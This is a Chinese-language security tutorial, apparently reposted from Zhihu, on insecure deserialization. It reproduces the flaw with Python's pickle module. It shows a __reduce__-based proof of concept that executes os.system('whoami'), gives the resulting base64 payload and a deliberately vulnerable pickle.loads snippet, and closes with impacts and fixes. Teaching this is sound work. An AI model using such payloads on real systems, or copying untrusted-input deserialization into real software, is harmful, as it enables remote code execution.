> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [zhuanlan.zhihu.com](https://zhuanlan.zhihu.com/p/631470072)

1.1. 什么是序列化和反序列化
----------------

序列化和反序列化是指用于将对象或数据结构转换为字节流的过程，以便在不同系统之间进行传输或存储，并在需要时重新构造。

**序列化是指将对象或数据结构转换为字节流的过程。**在序列化过程中，对象的状态和数据被转换为一系列字节，这些字节可以按照一定的协议进行传输或存储。序列化通常用于将对象存储到磁盘或通过网络发送到其他系统。序列化后的字节流可以被保存下来，以后可以通过反序列化操作重新构建对象并恢复其状态和数据。

**反序列化是指将序列化后的字节流转换回对象或数据结构的过程。**在反序列化过程中，字节流被读取并解析，以还原为原始的对象或数据结构。反序列化通常用于从磁盘加载保存的对象或接收通过网络传输的序列化数据。通过反序列化，可以重新构建对象并恢复其之前序列化的状态和数据。

序列化和反序列化在许多领域都有广泛的应用，例如分布式系统、持久化存储、缓存机制以及跨平台通信。它们允许将复杂的对象或数据结构转换为字节流进行传输或存储，从而实现不同系统之间的数据交换和共享。

1.2. 漏洞介绍
---------

不安全的反序列化是指在反序列化过程中存在潜在安全风险的情况，如果序列化的内容可控，在传递给应用进行反序列化时，可能会导致执行恶意代码或触发其他不受控制的行为。

以下是一些常见的不安全反序列化的情况：

1.  **不受限制的反序列化**：如果反序列化操作没有适当的验证和限制，允许任意的序列化数据被反序列化，攻击者可以构造恶意的序列化数据来执行恶意代码。
2.  **未经过滤的输入**：如果反序列化操作接受未经过滤的输入数据，攻击者可以通过构造特定的恶意数据来执行命令或导致不受控制的行为。
3.  **自定义的反序列化逻辑**：如果使用自定义的反序列化逻辑而不是使用安全的序列化库或框架，可能会导致安全问题。自定义逻辑可能缺乏必要的安全验证和过滤步骤，从而容易受到攻击。
4.  **恶意的序列化数据**：如果攻击者能够在反序列化操作中提供恶意构造的序列化数据，可能会导致命令执行或其他不受控制的行为。

1.3. 复现过程
---------

网上大多是采用的 php 进行复现，一搜一大堆，这里我们用 Python 的`pickle`模块来进行复现。

### 1.3.1. pickle 模块介绍

参考 [doc](https://link.zhihu.com/?target=https%3A//docs.python.org/zh-cn/3/library/pickle.html)，可见是一个序列化模块。

![](https://pic1.zhimg.com/v2-f99bdcf245a848ceada8876d4b405f7c_b.png)

基础使用如下：

```
import pickle

# 定义一个对象
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

# 创建一个 Person 对象
person = Person("d4m1ts", 18)

# 序列化对象
serialized_data = pickle.dumps(person)

# 序列化后的二进制数据
print(f"序列化后的数据: {serialized_data}", end="\n\n")

# 反序列化数据
deserialized_person = pickle.loads(serialized_data)

# 访问反序列化后的对象属性
print(f"反序列化后的对象所属类: {deserialized_person.__class__}")
print(f"name: {deserialized_person.name}")  # 输出: d4m1ts
print(f"age: {deserialized_person.age}")  # 输出: 18


```

![](https://pic3.zhimg.com/v2-d9b00bdf78a8e88f01d7b72938266816_b.png)

### 1.3.2. 魔术方法 **reduce**()

在 Python 中，`__reduce__()`是一个特殊方法，用于定义对象的序列化行为。当使用`pickle`模块对对象进行序列化和反序列化时，`__reduce__()`方法会被调用。

`__reduce__()`方法应该返回一个元组`()`，其中包含两个或三个元素。元组的第一个元素是用于重新构建对象的函数，第二个元素是传递给构建函数的参数（通常是一个元组），而第三个元素（可选）是用于恢复对象状态的可迭代对象。

简单来说，我们可以通过重写`__reduse__()`函数，来修改数据反序列化的方式。

修改刚才的代码，举例如下：

```
import pickle

# 定义一个对象
class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def __reduce__(self):
        print("Calling __reduce__()")
        # return (self.__class__, (self.value,))
        return (print, ("reduse poc test",))


# 创建一个 Person 对象
person = Person("d4m1ts", 18)

# 序列化对象
serialized_data = pickle.dumps(person)

# 序列化后的二进制数据
print(f"序列化后的数据: {serialized_data}", end="\n\n")

# 反序列化数据
deserialized_person = pickle.loads(serialized_data)

# 访问反序列化后的对象属性
print(f"反序列化后的对象所属类: {deserialized_person.__class__}")
print(f"name: {deserialized_person.name}")  # 输出: d4m1ts
print(f"age: {deserialized_person.age}")  # 输出: 18


```

可见在反序列化的时候，调用的是我们重写时用的`print`方法。

![](https://pic2.zhimg.com/v2-4b04e436e07a4329f8ed63ac5bfc6319_b.png)

### 1.3.3. 漏洞场景举例复现

假设漏洞场景代码如下，其中`userInput`是我们可以控制输入的地方：

```
import pickle
import base64

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

userInput = ""
deserialized_person = pickle.loads(base64.b64decode(userInput))
print(f"反序列化后的对象所属类: {deserialized_person.__class__}")


```

根据上述代码，构造 POC 代码，生成序列化的内容，其中编写`__reduse__()`函数如下：

```
import pickle
import base64

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

    def __reduce__(self):
        return (eval, ('__import__("os").system("whoami")',))


person = Person("d4m1ts", 18)
serialized_data = pickle.dumps(person)
print(base64.b64encode(serialized_data).decode())


```

得到 payload 为： `gANjYnVpbHRpbnMKZXZhbApxAFghAAAAX19pbXBvcnRfXygib3MiKS5zeXN0ZW0oIndob2FtaSIpcQGFcQJScQMu`

把 payload 插入漏洞场景测试一下：

```
import pickle
import base64

class Person:
    def __init__(self, name, age):
        self.name = name
        self.age = age

userInput = "gANjYnVpbHRpbnMKZXZhbApxAFghAAAAX19pbXBvcnRfXygib3MiKS5zeXN0ZW0oIndob2FtaSIpcQGFcQJScQMu"
deserialized_person = pickle.loads(base64.b64decode(userInput))
print(f"反序列化后的对象所属类: {deserialized_person.__class__}")


```

![](https://pic1.zhimg.com/v2-d5c8ac401e87e48d0f5ec73c003b615c_b.png)

可见成功执行了系统命令。

> 总结一下复现过程，就是写一个`__reduse__`函数来改变反序列化的行为即可。

1.4. 漏洞危害
---------

1.  远程代码执行：攻击者可以通过构造恶意序列化数据注入和执行任意代码，从而完全控制目标系统，并执行恶意操作。
2.  远程命令执行：攻击者可以通过反序列化漏洞在目标系统上执行远程命令，从而对其他系统或网络资源造成进一步的威胁。
3.  信息泄露：攻击者可以利用反序列化漏洞读取和获取目标系统中的敏感信息，例如数据库凭据、用户密码、加密密钥等。
4.  拒绝服务（DoS）攻击：攻击者可以发送恶意序列化数据来触发异常或消耗过多的系统资源，导致系统崩溃或无法提供正常的服务。

1.5. 修复建议
---------

*   使用安全的序列化库或框架，这些库经过严格测试和审查，并提供了适当的安全防护机制。
*   对反序列化输入进行严格的验证和过滤，只接受预期的数据格式和内容。
*   不要从不受信任的来源接受序列化数据，尽量限制数据来源。
*   定期更新和修复序列化库和相关组件，以获取最新的安全修补程序。
*   配置系统和应用程序的安全设置，限制恶意代码执行的可能性。